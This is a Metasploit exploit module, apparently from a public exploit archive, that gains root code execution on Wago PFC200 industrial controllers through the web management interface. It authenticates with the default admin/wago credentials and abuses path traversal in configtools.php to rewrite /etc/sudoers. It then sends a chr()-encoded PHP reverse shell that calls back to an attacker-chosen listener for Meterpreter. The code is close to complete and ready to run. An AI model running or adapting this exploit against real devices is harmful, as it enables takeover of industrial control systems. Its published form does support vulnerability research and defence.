# Exploit Title: Wago PFC200 - Authenticated Remote Code Execution (Metasploit)
# Date: 2020-02-05
# Exploit Author: Nico Jansen (0x483d)
# Vendor Homepage: https://www.wago.com/
# Version: <= Firmare 11 (02_08_35)
# Tested on: Linux
# CVE : N/A

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'json'

class MetasploitModule < Msf::Exploit::Remote
  #Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Wago PFC200 authenticated remote code execution',
      'Description' => %q{
        The Wago PFC200 (up to incl. Firmware 11 02_08_35) is vulnerable to an authenticated remote code execution in the
        administrative web interface. By exploiting the vulnerability, an attacker is able to run system commands in root context.
        To execute this module, login credenials of the website administrator are required (default: admin/wago).
        This module was tested against a Wago 750-8202 Firmware 11 (02_08_35) but other PFC200 models may be affected as well.
      },
      'Author' =>
        [
          'Nico Jansen (0x483d)' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'Platform' => 'php',
      'References' =>
        [
          ['CVE', '-'],
          ['US-CERT-VU', '-'],
          ['URL', '-'],
          ['URL', '-']
        ],
      'DisclosureDate' => 'Aug 1 2018',
      'Privileged' => true,
      'DefaultOptions' => {
        'PAYLOAD' => 'php/meterpreter/reverse_tcp',
        'SSL' => true,
      },
      'Targets' => [
        ['Automatic', {}]
      ],
      'DefaultTarget'   => 0))

      register_options(
        [
          Opt::RPORT(443),
          OptString.new('ADMINPASSWORD', [true, 'Password to authenticate as admin', 'wago']),
        ])

        deregister_options('VHOST')
  end

  # This function checks the index page to check if it may be a valid device.
  # There are some more checks done after an successful authentication
  def check
    @csrf=""
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => '/wbm/index.php'
    )

    if res && res.code == 200 && res.body.to_s =~ /WAGO Ethernet Web-based Management/
      result = sendConfigToolMessage("get_typelabel_value", ["SYSDESC"])
      if result and result =~ /PFC200/
        # Get Version and check if it's <= 11
        result = sendConfigToolMessage("get_coupler_details", ["firmware-revision"])
        result = result.split('(')[1]
        result = result.split(')')[0]
        if Integer(result) <= 11
          return Exploit::CheckCode::Vulnerable
        else
          return Exploit::CheckCode::Safe
        end
      end
      return Exploit::CheckCode::Safe
    end
    return Exploit::CheckCode::Safe
  end

  # This function authenticates the adminuser against the Wago PLC
  def login
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => '/wbm/login.php',
      'data' => '{"username":"admin","password":"' + datastore['ADMINPASSWORD'] + '"}'
    )
    if res.code != 200
      return false
    end

    parsed_json = JSON.parse(res.body.to_s)
    if parsed_json["status"] == 0
      @cookie = res.get_cookies
      @csrf = parsed_json["csrfToken"]
      return true
    else
      return false
    end
  end

  # This function can be used to execute arbitary commands after login
  def sendConfigToolMessage(scriptname, parameters, expectResponse=true)
    parameterString = ''
    for param in parameters
      parameterString = parameterString + '"' + param + '", '
    end

    parameterString = parameterString[0...-2]
    request ='{"csrfToken":"' + @csrf + '",'\
      '"renewSession":true,"aDeviceParams":{"0"'\
      ':{"name":"' + scriptname + '","parameter":['\
      + parameterString + '],"sudo":true,"multiline":false,'\
      '"timeout":12000,"dataId":0}}}'

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => '/wbm/configtools.php',
      'data' => request,
      'cookie' => @cookie,
    )
    # After exploitation, there is no response, so just return true because the message was sent
    if expectResponse == false
      return true
    end

    parsed_json = JSON.parse(res.body.to_s)
    @csrf = parsed_json["csrfToken"]
    if parsed_json["aDeviceResponse"][0]["status"] == 0
      return parsed_json["aDeviceResponse"][0]["resultString"]
    else
      return false
    end
  end

  # This function is used to enable php execution in sudoers file using sed
  def change_sudo_permissions()
    return sendConfigToolMessage('/../../../usr/bin/sed',["-i", "s/NOPASSWD:/NOPASSWD:ALL#/", "/etc/sudoers"])
  end

  # Encode a given string to bypass validation
  def encode(content)
    result = ""
    content.split("").each do |i|
      result = result + "chr(" + (i.ord).to_s + ")."
    end
    result = result[0...-1]
    return result
  end

  # This function generates the required payload used to connect to the msf listener
  def send_payload()
    meterpreter_reverse_php='exec("/usr/bin/sed -i \'s/NOPASSWD:ALL#/NOPASSWD:/\' \'/etc/sudoers\'"); $ip = "' + datastore['LHOST'] + '"; $port = ' + datastore['LPORT'].to_s + '; '\
    'if (($f = "stream_socket_client") && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); '\
    '$s_type = "stream"; } if (!$s && ($f = "fsockopen") && is_callable($f)) { $s = $f($ip, $port);'\
    ' $s_type = "stream"; } if (!$s && ($f = "socket_create") && is_callable($f)) '\
    '{ $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) '\
    '{ die(); } $s_type = "socket"; } if (!$s_type) { die("no socket funcs"); } '\
    'if (!$s) { die("no socket"); } switch ($s_type) { case "stream": $len = fread($s, 4); break; '\
    'case "socket": $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len);'\
    ' $len = $a["len"]; $b = ""; while (strlen($b) < $len) { switch ($s_type) { case "stream": $b .= '\
    'fread($s, $len-strlen($b)); break; case "socket": $b .= socket_read($s, $len-strlen($b)); break; } } '\
    '$GLOBALS["msgsock"] = $s; $GLOBALS["msgsock_type"] = $s_type; if (extension_loaded("suhosin") '\
    '&& ini_get("suhosin.executor.disable_eval")) { $suhosin_bypass=create_function("", $b); $suhosin_bypass(); } '\
    'else { eval($b); } die(); ?>'

    command = "eval(" + encode(meterpreter_reverse_php) + ");"
    return sendConfigToolMessage("/../../../usr/bin/php5", ["-r", command], false)
  end

  def exploit
    if check == Exploit::CheckCode::Vulnerable # Check if the system may be a PFC200
      print_good("Target seems to be a vulnerable PFC200 device")
      if login # Try to authenticate using the given credentials
        print_good("Successfully logged in as website admin")
        if change_sudo_permissions()
          print_good("Manipulated the /etc/sudoers file to enable php execution as root")
          print_good("Preparing meterpreter payload and undoing changes to /etc/sudoers...")
          send_payload()
        else
          print_error("Unable to modify the /etc/sudoers file...")
        end
      else
        print_error("Unable to login as admin with the given credentials...")
      end
    else
      print_error("Target is not a valid PFC200 device. Will exit now...")
    end
  end
end